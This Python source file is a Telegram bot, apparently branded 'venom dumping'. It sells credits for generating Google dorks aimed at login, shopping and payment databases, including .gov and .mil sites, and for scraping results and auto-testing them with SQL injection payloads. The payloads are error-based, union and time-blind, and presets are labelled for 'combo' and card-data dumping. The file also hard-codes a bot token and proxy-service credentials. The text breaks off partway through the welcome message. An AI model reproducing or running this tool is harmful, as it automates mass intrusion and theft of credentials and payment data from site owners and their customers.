import io
import json
import os
import re
import uuid
import random
import logging
import asyncio
import traceback
import aiohttp
from datetime import datetime
from urllib.parse import urlparse
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ApplicationBuilder, ContextTypes, MessageHandler,
    CommandHandler, CallbackQueryHandler, filters
)

# --- CONFIG ---
TELEGRAM_TOKEN = "7545064228:AAHYqBGcXGJpK1WUp68-uuLZjMjTiPEPb2o"
OXY_USER = "Pika1_MhRPr"
OXY_PASS = "Pika=1234pika"
OWNER_IDS = {7214730073, 8003049490}
DB_FILE = "users_db.json"
PARSER_THREADS = 5
GLOBAL_MAX_CONCURRENT = 10

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger("AlephBot")

# ──────────────────────────────────────────────
#  DATABASE
# ──────────────────────────────────────────────

def load_db():
    if not os.path.exists(DB_FILE):
        return {}
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_db(db_data):
    with open(DB_FILE, 'w') as f:
        json.dump(db_data, f, indent=2)

def get_user(user_id):
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"credits": 0, "banned": False, "uses": 0}
        save_db(db)
    return db[uid]

db = load_db()
active_keys = {}
user_states = {}

# ──────────────────────────────────────────────
#  VISUAL HELPERS
# ──────────────────────────────────────────────

DIV = "─────────────────────────"

def pbar(done, total, width=12):
    filled = int(width * done / total) if total else 0
    bar = "█" * filled + "░" * (width - filled)
    pct = int(100 * done / total) if total else 0
    return f"`[{bar}]` {pct}%"

def esc(text):
    for ch in r'_*[]()~`>#+-=|{}.!':
        text = text.replace(ch, f'\\{ch}')
    return text

def back_kb(target='back_menu'):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⬅️  Back to Menu", callback_data=target)]
    ])

def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔤  Keyword Maker", callback_data='mode_kw')],
        [InlineKeyboardButton("🛠  Dork Generator", callback_data='mode_gen')],
        [InlineKeyboardButton("🔎  Deep Parser", callback_data='mode_parse')],
        [InlineKeyboardButton("💉  SQL Tester", callback_data='mode_sql')],
        [InlineKeyboardButton("💰  My Balance", callback_data='show_balance')],
        [InlineKeyboardButton("❓  Help", callback_data='show_help')],
    ])

COUNT_OPTIONS = [50, 100, 250, 500, 1000]

def count_kb(prefix):
    rows = []
    row = []
    for c in COUNT_OPTIONS:
        row.append(InlineKeyboardButton(str(c), callback_data=f"{prefix}_{c}"))
        if len(row) == 3:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    rows.append([InlineKeyboardButton("✏️  Custom Number", callback_data=f"{prefix}_custom")])
    return rows

def extract_brand(site_input):
    site_input = site_input.strip().lower()
    if '/' in site_input or '.' in site_input:
        if not site_input.startswith('http'):
            site_input = 'https://' + site_input
        try:
            host = urlparse(site_input).hostname or site_input
        except Exception:
            host = site_input
        parts = host.replace('www.', '').split('.')
        return parts[0] if parts else site_input
    return site_input

# ──────────────────────────────────────────────
#  KEYWORD MAKER — Google Suggest via Oxylabs
# ──────────────────────────────────────────────

KW_SUFFIXES = [
    "login", "account", "password", "email", "database", "users",
    "combo", "premium", "free", "cracked", "config", "checker",
    "generator", "hack", "dump", "leak", "breach", "exploit",
    "admin", "panel", "dashboard", "api", "key", "token",
    "signup", "register", "reset", "forgot", "recovery",
    "subscription", "membership", "plan", "trial", "coupon",
    "gift card", "code", "voucher", "discount", "promo",
    "order", "payment", "billing", "invoice", "receipt",
    "customer", "support", "contact", "help", "faq",
    "download", "upload", "file", "backup", "export",
    "settings", "profile", "edit", "update", "delete",
    "search", "filter", "sort", "list", "view",
    "cart", "checkout", "shop", "store", "buy",
    "mobile", "app", "desktop", "web", "online",
    "error", "bug", "fix", "issue", "problem",
    "sql", "injection", "vulnerability", "security", "bypass",
    "proxy", "vpn", "ssh", "ftp", "smtp",
]

KW_PREFIXES = [
    "free", "buy", "get", "how to", "best",
    "cheap", "crack", "hack", "dump",
]

ALPHA = "abcdefghijklmnopqrstuvwxyz"

async def fetch_google_suggest(session, query):
    url = "https://realtime.oxylabs.io/v1/queries"
    payload = {
        "source": "google_search",
        "query": query,
        "user_agent_type": "desktop_chrome",
        "parse": True,
        "start_page": 1,
        "pages": 1,
        "limit": 10,
    }
    try:
        async with session.post(
            url, auth=aiohttp.BasicAuth(OXY_USER, OXY_PASS),
            json=payload, timeout=aiohttp.ClientTimeout(total=30),
        ) as r:
            if r.status != 200:
                return []
            data = await r.json()
            keywords = set()
            for page in data.get("results", []):
                content = page.get("content", {})
                results = content.get("results", {})
                organic = results.get("organic", [])
                for item in organic:
                    title = item.get("title", "")
                    if title:
                        keywords.add(title.lower().strip())
                    desc = item.get("desc", "")
                    if desc:
                        words = re.findall(r'[a-zA-Z0-9]+(?:\s+[a-zA-Z0-9]+){0,3}', desc.lower())
                        for w in words[:5]:
                            keywords.add(w.strip())
                related = results.get("related_searches", {})
                if isinstance(related, dict):
                    for item in related.get("related_searches", []):
                        q = item.get("query", "")
                        if q:
                            keywords.add(q.lower().strip())
                elif isinstance(related, list):
                    for item in related:
                        q = item.get("query", "") if isinstance(item, dict) else str(item)
                        if q:
                            keywords.add(q.lower().strip())
                paa = results.get("people_also_ask", [])
                if isinstance(paa, list):
                    for item in paa:
                        q = item.get("question", "") if isinstance(item, dict) else str(item)
                        if q:
                            keywords.add(q.lower().strip())
            return list(keywords)
    except Exception as e:
        logger.error("Suggest err: %s", e)
        return []

async def fetch_suggest_throttled(session, query, sem):
    async with sem:
        async with global_queue.slot():
            return await fetch_google_suggest(session, query)

async def generate_keywords(session, brand, max_count, status_msg, sem):
    all_kw = set()
    all_kw.add(brand)
    all_kw.add(f"{brand}.com")
    all_kw.add(f"{brand} login")
    all_kw.add(f"{brand} account")

    for s in KW_SUFFIXES:
        all_kw.add(f"{brand} {s}")
    for p in KW_PREFIXES:
        all_kw.add(f"{p} {brand}")
    for letter in ALPHA:
        all_kw.add(f"{brand} {letter}")

    logger.info("KW: algorithmic generated %d base keywords for '%s'", len(all_kw), brand)

    if len(all_kw) < max_count:
        seed_queries = [brand]
        for letter in ALPHA:
            seed_queries.append(f"{brand} {letter}")
        seed_queries = seed_queries[:27]

        try:
            await status_msg.edit_text(
                f"🔤 *Keyword Maker — Scraping*\n{DIV}\n\n"
                f"   Brand: `{esc(brand)}`\n"
                f"   Base keywords: `{len(all_kw)}`\n"
                f"   Scraping Google for more\\.\\.\\.\n\n"
                f"{pbar(len(all_kw), max_count)}",
                parse_mode=ParseMode.MARKDOWN_V2)
        except Exception:
            pass

        tasks = [fetch_suggest_throttled(session, q, sem) for q in seed_queries]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in results:
            if isinstance(r, list):
                for kw in r:
                    kw_clean = kw.strip().lower()
                    if kw_clean and len(kw_clean) > 2:
                        all_kw.add(kw_clean)

        logger.info("KW: after scraping got %d keywords for '%s'", len(all_kw), brand)

        try:
            await status_msg.edit_text(
                f"🔤 *Keyword Maker — Processing*\n{DIV}\n\n"
                f"   Brand: `{esc(brand)}`\n"
                f"   Scraped keywords: `{len(all_kw)}`\n"
                f"   Expanding to `{max_count}`\\.\\.\\.\n\n"
                f"{pbar(len(all_kw), max_count)}",
                parse_mode=ParseMode.MARKDOWN_V2)
        except Exception:
            pass

    if len(all_kw) < max_count:
        extra_suffixes = [
            "2024", "2025", "2026", "new", "latest", "working",
            "fresh", "valid", "real", "legit", "official",
            "site", "website", "page", "portal", "link",
            "data", "info", "details", "list", "collection",
            "tool", "software", "script", "bot", "automation",
            "test", "demo", "sample", "example", "tutorial",
            "method", "trick", "tip", "guide", "manual",
            "alternative", "similar", "like", "clone", "copy",
            "pro", "plus", "ultra", "max", "lite",
            "mod", "patch", "crack", "serial", "keygen",
            "private", "public", "shared", "open", "closed",
            "basic", "standard", "enterprise", "business", "personal",
        ]
        for s in extra_suffixes:
            all_kw.add(f"{brand} {s}")
            if len(all_kw) >= max_count * 2:
                break
        for s1 in KW_SUFFIXES[:20]:
            for s2 in extra_suffixes[:10]:
                all_kw.add(f"{brand} {s1} {s2}")
                if len(all_kw) >= max_count * 2:
                    break
            if len(all_kw) >= max_count * 2:
                break

    kw_list = list(all_kw)
    random.shuffle(kw_list)
    return kw_list[:max_count]

# ──────────────────────────────────────────────
#  PRESET TEMPLATES
# ──────────────────────────────────────────────

PRESET_COMBO = {
    "key": "combo",
    "label": "Site Targeted Combo",
    "icon": "🎯",
    "desc": "SQLi dorks targeting login/user databases for combo dumping",
    "templates": [
        'inurl:login.php?id= "{kw}"', 'inurl:member.php?id= "{kw}"',
        'inurl:user.php?id= "{kw}"', 'inurl:profile.php?id= "{kw}"',
        'inurl:account.php?id= "{kw}"', 'inurl:index.php?id= "{kw}"',
        'inurl:view.php?id= "{kw}"', 'inurl:detail.php?id= "{kw}"',
        'inurl:page.php?id= "{kw}"', 'inurl:show.php?id= "{kw}"',
        'inurl:content.php?id= "{kw}"', 'inurl:info.php?id= "{kw}"',
        'inurl:main.php?id= "{kw}"', 'inurl:default.php?id= "{kw}"',
        'inurl:admin.php?id= "{kw}"', 'inurl:login.asp?id= "{kw}"',
        'inurl:default.asp?id= "{kw}"', 'inurl:user.aspx?id= "{kw}"',
        'inurl:users.php?id= "{kw}"', 'inurl:customer.php?id= "{kw}"',
        'inurl:signup.php?id= "{kw}"', 'inurl:register.php?id= "{kw}"',
        'inurl:auth.php?id= "{kw}"', 'inurl:accounts.php?id= "{kw}"',
        'inurl:panel.php?id= "{kw}"', 'inurl:dashboard.php?id= "{kw}"',
        'inurl:portal.php?id= "{kw}"', 'inurl:members.php?id= "{kw}"',
        'inurl:subscriber.php?id= "{kw}"', 'inurl:manage.php?id= "{kw}"',
        'inurl:.php?user_id= "{kw}"', 'inurl:.php?uid= "{kw}"',
        'inurl:.php?member_id= "{kw}"', 'inurl:.php?account_id= "{kw}"',
        'inurl:.php?login_id= "{kw}"',
    ],
}

PRESET_SHOPPING = {
    "key": "shopping",
    "label": "Shopping SQLi",
    "icon": "🛒",
    "desc": "SQLi dorks targeting e-commerce sites for order/account dumping",
    "templates": [
        'inurl:product.php?id= "{kw}"', 'inurl:item.php?id= "{kw}"',
        'inurl:shop.php?id= "{kw}"', 'inurl:store.php?id= "{kw}"',
        'inurl:buy.php?id= "{kw}"', 'inurl:cart.php?id= "{kw}"',
        'inurl:order.php?id= "{kw}"', 'inurl:checkout.php?id= "{kw}"',
        'inurl:catalog.php?id= "{kw}"', 'inurl:category.php?id= "{kw}"',
        'inurl:products.php?cat= "{kw}"', 'inurl:goods.php?id= "{kw}"',
        'inurl:productdetail.php?id= "{kw}"', 'inurl:product_detail.php?id= "{kw}"',
        'inurl:product-detail.php?id= "{kw}"', 'inurl:view_product.php?id= "{kw}"',
        'inurl:item_detail.php?id= "{kw}"', 'inurl:shopping.php?id= "{kw}"',
        'inurl:basket.php?id= "{kw}"', 'inurl:invoice.php?id= "{kw}"',
        'inurl:wishlist.php?id= "{kw}"', 'inurl:purchase.php?id= "{kw}"',
        'inurl:listing.php?id= "{kw}"', 'inurl:offer.php?id= "{kw}"',
        'inurl:deal.php?id= "{kw}"', 'inurl:price.php?id= "{kw}"',
        'inurl:.php?product_id= "{kw}"', 'inurl:.php?item_id= "{kw}"',
        'inurl:.php?cat_id= "{kw}"', 'inurl:.php?category_id= "{kw}"',
        'inurl:.php?order_id= "{kw}"', 'inurl:.php?shop_id= "{kw}"',
        'inurl:.php?pid= "{kw}"', 'inurl:.php?prod= "{kw}"',
        'inurl:.php?goods_id= "{kw}"',
    ],
}

PRESET_CC = {
    "key": "cc",
    "label": "CC / Payment SQLi",
    "icon": "💳",
    "desc": "SQLi dorks targeting payment gateways & billing systems",
    "templates": [
        'inurl:payment.php?id= "{kw}"', 'inurl:billing.php?id= "{kw}"',
        'inurl:pay.php?id= "{kw}"', 'inurl:transaction.php?id= "{kw}"',
        'inurl:checkout.php?id= "{kw}"', 'inurl:receipt.php?id= "{kw}"',
        'inurl:donate.php?id= "{kw}"', 'inurl:subscription.php?id= "{kw}"',
        'inurl:gateway.php?id= "{kw}"', 'inurl:process.php?id= "{kw}"',
        'inurl:charge.php?id= "{kw}"', 'inurl:transfer.php?id= "{kw}"',
        'inurl:wallet.php?id= "{kw}"', 'inurl:refund.php?id= "{kw}"',
        'inurl:confirm.php?id= "{kw}"', 'inurl:paymentinfo.php?id= "{kw}"',
        'inurl:payment_detail.php?id= "{kw}"', 'inurl:order_payment.php?id= "{kw}"',
        'inurl:booking.php?id= "{kw}"', 'inurl:reserve.php?id= "{kw}"',
        'inurl:plan.php?id= "{kw}"', 'inurl:invoice.php?id= "{kw}"',
        'inurl:topup.php?id= "{kw}"', 'inurl:recharge.php?id= "{kw}"',
        'inurl:deposit.php?id= "{kw}"', 'inurl:.php?payment_id= "{kw}"',
        'inurl:.php?transaction_id= "{kw}"', 'inurl:.php?billing_id= "{kw}"',
        'inurl:.php?invoice_id= "{kw}"', 'inurl:.php?receipt_id= "{kw}"',
        'inurl:.php?booking_id= "{kw}"', 'inurl:.php?order_id= "{kw}"',
        'inurl:.php?plan_id= "{kw}"', 'inurl:.php?sub_id= "{kw}"',
        'inurl:.php?pay_id= "{kw}"',
    ],
}

PRESETS = {"combo": PRESET_COMBO, "shopping": PRESET_SHOPPING, "cc": PRESET_CC}

# ──────────────────────────────────────────────
#  CUSTOM BUILDER TEMPLATES
# ──────────────────────────────────────────────

DORK_CATEGORIES = {
    "sensitive": {
        "label": "Sensitive Files", "icon": "📄",
        "templates": [
            'filetype:sql "{kw}"', 'filetype:env "{kw}"',
            'filetype:log "{kw}"', 'filetype:cfg "{kw}"',
            'filetype:bak "{kw}"', 'filetype:old "{kw}"',
            'filetype:txt "{kw}" "password"', 'filetype:csv "{kw}" "email"',
            'filetype:xls "{kw}" "password"', 'filetype:conf "{kw}"',
            'filetype:ini "{kw}"', 'extension:yml "{kw}" "password"',
        ],
    },
    "login": {
        "label": "Login Pages", "icon": "🔐",
        "templates": [
            'inurl:admin/login "{kw}"', 'inurl:admin/login.php "{kw}"',
            'inurl:admin/login.asp "{kw}"', 'inurl:user/login "{kw}"',
            'inurl:signin "{kw}"', 'inurl:wp-login.php "{kw}"',
            'intitle:"admin panel" "{kw}"', 'intitle:"login" inurl:admin "{kw}"',
            'intitle:"dashboard" inurl:login "{kw}"', 'inurl:cpanel "{kw}"',
            'inurl:webmail "{kw}"', 'intitle:"sign in" "{kw}"',
        ],
    },
    "dirs": {
        "label": "Exposed Directories", "icon": "📂",
        "templates": [
            'intitle:"index of" "{kw}"', 'intitle:"index of /" "{kw}"',
            'intitle:"index of" "parent directory" "{kw}"',
            'intitle:"Index of" ".git" "{kw}"',
            'intitle:"index of" "backup" "{kw}"', 'intitle:"index of" ".env" "{kw}"',
            'intitle:"index of" "wp-content" "{kw}"',
            'intitle:"index of" "uploads" "{kw}"',
            'intitle:"index of" "config" "{kw}"',
            'intitle:"index of" "database" "{kw}"',
            'intitle:"index of" "private" "{kw}"',
            'intitle:"index of" "secret" "{kw}"',
        ],
    },
    "db": {
        "label": "Database Leaks", "icon": "🗄",
        "templates": [
            'filetype:sql "insert into" "{kw}"', 'filetype:sql "password" "{kw}"',
            'filetype:sql "CREATE TABLE" "{kw}"', 'intext:"DB_PASSWORD" "{kw}"',
            'intext:"DB_HOST" "{kw}"', 'intext:"mysql_connect" "{kw}"',
            'filetype:env "DB_PASSWORD" "{kw}"', 'filetype:env "DATABASE_URL" "{kw}"',
            'intext:"connectionString" filetype:config "{kw}"',
            'filetype:properties "jdbc" "{kw}"',
            'intext:"pg_connect" "{kw}"', 'filetype:sql "phpMyAdmin" "{kw}"',
        ],
    },
    "cloud": {
        "label": "Cloud Storage", "icon": "☁️",
        "templates": [
            'site:s3.amazonaws.com "{kw}"', 'site:blob.core.windows.net "{kw}"',
            'site:storage.googleapis.com "{kw}"', 'site:firebaseio.com "{kw}"',
            'site:digitaloceanspaces.com "{kw}"', 'inurl:s3.amazonaws.com "{kw}"',
            'inurl:storage.cloud.google.com "{kw}"', 'site:drive.google.com "{kw}"',
            'site:docs.google.com "{kw}"', 'site:amazonaws.com filetype:pdf "{kw}"',
            'site:firebasestorage.googleapis.com "{kw}"',
            'inurl:dropbox.com/s/ "{kw}"',
        ],
    },
    "api": {
        "label": "API Keys & Secrets", "icon": "🔑",
        "templates": [
            'extension:json "api_key" "{kw}"', 'extension:json "apikey" "{kw}"',
            'extension:json "secret" "{kw}"', 'filetype:env "API_KEY" "{kw}"',
            'filetype:env "SECRET_KEY" "{kw}"', 'filetype:env "AWS_ACCESS" "{kw}"',
            'intext:"PRIVATE KEY" filetype:key "{kw}"',
            'filetype:pem "PRIVATE" "{kw}"', 'filetype:ppk "{kw}"',
            'intext:"api_secret" "{kw}"', 'filetype:json "client_secret" "{kw}"',
            'filetype:yaml "apiKey" "{kw}"',
        ],
    },
    "all": {"label": "All Types", "icon": "🌐", "templates": []},
}

SITE_TYPES = {
    "any":  {"label": "Any Site",   "icon": "🌐", "prefix": ""},
    "gov":  {"label": ".gov Sites", "icon": "🏛", "prefix": "site:*.gov "},
    "edu":  {"label": ".edu Sites", "icon": "🎓", "prefix": "site:*.edu "},
    "org":  {"label": ".org Sites", "icon": "🏢", "prefix": "site:*.org "},
    "com":  {"label": ".com Sites", "icon": "💼", "prefix": "site:*.com "},
    "mil":  {"label": ".mil Sites", "icon": "🎖", "prefix": "site:*.mil "},
}

PAGE_PARAMS = {
    "inurl":    {"label": "URL Parameters", "icon": "🔗", "extra": [
        'inurl:php?id= "{kw}"', 'inurl:asp?id= "{kw}"', 'inurl:page= "{kw}"',
        'inurl:cat= "{kw}"', 'inurl:item= "{kw}"', 'inurl:view= "{kw}"',
        'inurl:product= "{kw}"', 'inurl:file= "{kw}"', 'inurl:download= "{kw}"',
        'inurl:action= "{kw}"',
    ]},
    "filetype": {"label": "File Types", "icon": "📎", "extra": [
        'filetype:pdf "{kw}"', 'filetype:doc "{kw}"', 'filetype:docx "{kw}"',
        'filetype:ppt "{kw}"', 'filetype:xlsx "{kw}"', 'filetype:xml "{kw}"',
        'filetype:json "{kw}"', 'filetype:txt "{kw}"',
    ]},
    "intitle":  {"label": "Page Titles", "icon": "📰", "extra": [
        'intitle:"{kw}"', 'intitle:"{kw}" "admin"', 'intitle:"{kw}" "login"',
        'intitle:"{kw}" "dashboard"', 'intitle:"{kw}" "config"',
        'intitle:"{kw}" "error"', 'allintitle:"{kw}" password',
    ]},
    "intext":   {"label": "Page Content", "icon": "📝", "extra": [
        'intext:"{kw}"', 'intext:"{kw}" "password"', 'intext:"{kw}" "username"',
        'intext:"{kw}" "secret"', 'allintext:"{kw}" "confidential"',
        'allintext:"{kw}" "internal"',
    ]},
    "none":     {"label": "No Extra Params", "icon": "➖", "extra": []},
}

# ──────────────────────────────────────────────
#  DORK BUILDING
# ──────────────────────────────────────────────

def build_preset_dorks(keywords, preset_key, max_count):
    preset = PRESETS.get(preset_key)
    if not preset:
        return []
    templates = preset["templates"]
    seen = set()
    all_dorks = []
    for kw in keywords:
        for t in templates:
            dork = t.format(kw=kw)
            if dork not in seen:
                seen.add(dork)
                all_dorks.append(dork)
    if len(all_dorks) > max_count:
        random.shuffle(all_dorks)
        all_dorks = all_dorks[:max_count]
    return all_dorks

def build_custom_dorks(keywords, dork_type, site_type, page_param, max_count):
    templates = []
    if dork_type == "all":
        for key, cat in DORK_CATEGORIES.items():
            if key != "all":
                templates.extend(cat["templates"])
    else:
        templates.extend(DORK_CATEGORIES.get(dork_type, {}).get("templates", []))
    pp = PAGE_PARAMS.get(page_param, {})
    templates.extend(pp.get("extra", []))
    if not templates:
        templates = ['intitle:"index of" "{kw}"', 'filetype:sql "password" "{kw}"', 'inurl:php?id= "{kw}"']
    site_prefix = SITE_TYPES.get(site_type, {}).get("prefix", "")
    seen = set()
    all_dorks = []
    for kw in keywords:
        for t in templates:
            dork = site_prefix + t.format(kw=kw)
            if dork not in seen:
                seen.add(dork)
                all_dorks.append(dork)
    if len(all_dorks) > max_count:
        random.shuffle(all_dorks)
        all_dorks = all_dorks[:max_count]
    return all_dorks

# ──────────────────────────────────────────────
#  SQL SCANNER (verified, XDumpGO-grade)
# ──────────────────────────────────────────────

PROBE_PAYLOADS = ["'", "\"", "')", "\\", "1'"]

CONFIRM_PAYLOADS = [
    " AND 1=1--",
    " AND 1=2--",
    " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    " AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
    " AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)--",
    " OR GTID_SUBSET(CONCAT(0x7e,version(),0x7e),0)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
    "' OR GTID_SUBSET(CONCAT(0x7e,version(),0x7e),0)--",
    " union select 1,2,3,4,5,6--",
    " order by 100--",
]

TIME_PAYLOADS = [
    (" AND SLEEP({delay})--", "mysql"),
    (" AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--", "mysql"),
    ("'; WAITFOR DELAY '0:0:{delay}'--", "mssql"),
    (" AND pg_sleep({delay})--", "postgres"),
]

SQL_ERRORS = [
    "you have an error in your sql syntax",
    "mysql_fetch_array()", "mysql_fetch_assoc()",
    "mysql_num_rows()", "mysql_connect()",
    "supplied argument is not a valid mysql",
    "warning: mysql_", "valid mysql result",
    "unclosed quotation mark after the character string",
    "microsoft ole db provider for sql server",
    "microsoft sql native client error",
    "system.data.sqlclient.sqlexception",
    "ora-00933", "ora-01756", "ora-00921",
    "pg_query(): query failed", "pg_exec()",
    "warning: pg_", "unterminated quoted string",
    "sqlite_error", "sqlite3::",
    "dynamic sql error", "syntax error in sql statement",
    "invision power board database error",
    "driver [pdo_mysql]", "sqlstate[",
    "duplicate entry", "subquery returns more than 1 row",
    "incorrect parameter count", "operand should contain 1 column",
    "xpath syntax error", "illegal mix of collations",
    "unknown column",
]

SQL_TIMEOUT = aiohttp.ClientTimeout(total=12)

BROWSER_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
]

def _make_headers():
    return {
        "User-Agent": random.choice(BROWSER_UAS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "max-age=0",
    }

async def _fetch(session, url, headers=None):
    try:
        async with session.get(url, timeout=SQL_TIMEOUT, ssl=False, allow_redirects=True, headers=headers) as r:
            body = await r.text(errors='ignore')
            return r.status, body, len(body)
    except asyncio.TimeoutError:
        return 0, "", 0
    except Exception:
        return -1, "", 0

def _find_errors(body):
    body_l = body.lower()
    return [e for e in SQL_ERRORS if e in body_l]

def _inject_param(base, params, param_idx, payload):
    new_params = list(params)
    new_params[param_idx] += payload
    return f"{base}?{'&'.join(new_params)}"

async def check_sql(session, url):
    if "?" not in url:
        return None

    base_part = url.split("?")[0]
    params = url.split("?")[1].split("&")
    hdrs = _make_headers()

    bs_status, bs_body, bs_len = await _fetch(session, url, hdrs)
    if bs_status <= 0:
        return None

    bs_errors = set(_find_errors(bs_body))

    for i in range(len(params)):
        pname = params[i].split("=")[0] if "=" in params[i] else params[i]

        # ── Phase 1: Probe with basic payloads ──
        probe_hit = False
        for payload in PROBE_PAYLOADS:
            test_url = _inject_param(base_part, params, i, payload)
            status, body, blen = await _fetch(session, test_url, hdrs)
            if status <= 0:
                continue
            new_errs = set(_find_errors(body)) - bs_errors
            if new_errs:
                probe_hit = True
                for cp in CONFIRM_PAYLOADS:
                    cu = _inject_param(base_part, params, i, cp)
                    cs, cb, cl = await _fetch(session, cu, hdrs)
                    if cs <= 0:
                        continue
                    cn = set(_find_errors(cb)) - bs_errors
                    if cn:
                        return f"[VULN:Error-Based] [param:{pname}] {url}"
                return f"[VULN:Error-Based] [param:{pname}] {url}"

        # ── Phase 2: Direct confirm payloads ──
        for payload in CONFIRM_PAYLOADS:
            test_url = _inject_param(base_part, params, i, payload)
            status, body, blen = await _fetch(session, test_url, hdrs)
            if status <= 0:
                continue
            new_errs = set(_find_errors(body)) - bs_errors
            if new_errs:
                return f"[VULN:Error-Based] [param:{pname}] {url}"
            ldiff = abs(blen - bs_len)
            if "~" in body and ldiff > 100 and "0x7e" not in bs_body:
                return f"[VULN:Data-Extract] [param:{pname}] {url}"
            if ldiff > 2000 and status != bs_status:
                return f"[VULN:Boolean] [param:{pname}] {url}"

        # ── Phase 3: Time-based blind ──
        for tpl, db_type in TIME_PAYLOADS:
            short_url = _inject_param(base_part, params, i, tpl.format(delay=0))
            t1 = asyncio.get_event_loop().time()
            s1, _, _ = await _fetch(session, short_url, hdrs)
            time_short = asyncio.get_event_loop().time() - t1
            if s1 <= 0:
                continue

            long_url = _inject_param(base_part, params, i, tpl.format(delay=5))
            t2 = asyncio.get_event_loop().time()
            s2, _, _ = await _fetch(session, long_url, hdrs)
            time_long = asyncio.get_event_loop().time() - t2
            if s2 <= 0:
                continue

            if time_long >= 4.5 and time_long > time_short + 3.0:
                verify_url = _inject_param(base_part, params, i, tpl.format(delay=3))
                t3 = asyncio.get_event_loop().time()
                s3, _, _ = await _fetch(session, verify_url, hdrs)
                time_v = asyncio.get_event_loop().time() - t3
                if time_v >= 2.5 and time_v > time_short + 1.5:
                    return f"[VULN:Time-Blind({db_type})] [param:{pname}] {url}"

    return None

# ──────────────────────────────────────────────
#  GLOBAL QUEUE WITH POSITION TRACKING
# ──────────────────────────────────────────────

class GlobalQueue:
    def __init__(self, max_concurrent):
        self._sem = asyncio.Semaphore(max_concurrent)
        self._waiters = []
        self._lock = asyncio.Lock()
        self.active = 0
        self.max = max_concurrent

    async def _add_waiter(self):
        event = asyncio.Event()
        async with self._lock:
            self._waiters.append(event)
            pos = len(self._waiters)
        return event, pos

    async def _remove_waiter(self, event):
        async with self._lock:
            if event in self._waiters:
                self._waiters.remove(event)

    def get_queue_length(self):
        return len(self._waiters)

    def get_position(self, event):
        try:
            return self._waiters.index(event) + 1
        except ValueError:
            return 0

    class _SlotContext:
        def __init__(self, queue):
            self.queue = queue

        async def __aenter__(self):
            await self.queue._sem.acquire()
            async with self.queue._lock:
                self.queue.active += 1
            return self

        async def __aexit__(self, *args):
            async with self.queue._lock:
                self.queue.active -= 1
                if self.queue._waiters:
                    self.queue._waiters[0].set()
            self.queue._sem.release()

    def slot(self):
        return self._SlotContext(self)

global_queue = GlobalQueue(GLOBAL_MAX_CONCURRENT)

# ──────────────────────────────────────────────
#  PER-USER SEMAPHORES
# ──────────────────────────────────────────────

user_semaphores = {}

def get_semaphore(uid):
    if uid not in user_semaphores:
        user_semaphores[uid] = asyncio.Semaphore(PARSER_THREADS)
    return user_semaphores[uid]

# ──────────────────────────────────────────────
#  GOOGLE PARSER (user sem → global queue)
# ──────────────────────────────────────────────

async def fetch_oxylabs(session, query, sem=None):
    user_sem = sem or asyncio.Semaphore(PARSER_THREADS)
    async with user_sem:
        async with global_queue.slot():
            url = "https://realtime.oxylabs.io/v1/queries"
            payload = {
                "source": "google_search", "query": query,
                "user_agent_type": "desktop_chrome", "parse": True,
                "start_page": 1, "pages": 10, "limit": 50,
            }
            logger.info("PARSER [thread] query: %.100s", query)
            try:
                async with session.post(
                    url, auth=aiohttp.BasicAuth(OXY_USER, OXY_PASS),
                    json=payload, timeout=aiohttp.ClientTimeout(total=90),
                ) as r:
                    body_text = await r.text()
                    if r.status != 200:
                        logger.error("PARSER HTTP %d: %.80s — %.300s", r.status, query, body_text)
                        return []
                    try:
                        data = json.loads(body_text)
                    except json.JSONDecodeError as je:
                        logger.error("PARSER JSON err: %s", je)
                        return []
                    urls = []
                    for page in data.get("results", []):
                        organic = page.get("content", {}).get("results", {}).get("organic", [])
                        for item in organic:
                            u = item.get("url")
                            if u:
                                urls.append(u)
                    logger.info("PARSER got %d URLs: %.80s", len(urls), query)
                    return urls
            except asyncio.TimeoutError:
                logger.error("PARSER timeout: %.100s", query)
                return []
            except aiohttp.ClientError as e:
                logger.error("PARSER net err: %s — %s", query, e)
                return []
            except Exception as e:
                logger.error("PARSER err: %s\n%s", e, traceback.format_exc())
                return []

# ──────────────────────────────────────────────
#  HELPERS
# ──────────────────────────────────────────────

def is_banned(uid):
    return db.get(str(uid), {}).get("banned", False)

# ──────────────────────────────────────────────
#  STATIC TEXTS
# ──────────────────────────────────────────────

WELCOME = (
    "🐍 *𝓿𝓮𝓷𝓸𝓶 𝓭𝓾𝓶𝓹𝓲𝓷𝓰*\n"
    f"{DIV}\n\n"
    "Welcome\\! Pick a module to get started\\.\n\n"
    "📌 *Full Pipeline:*\n"
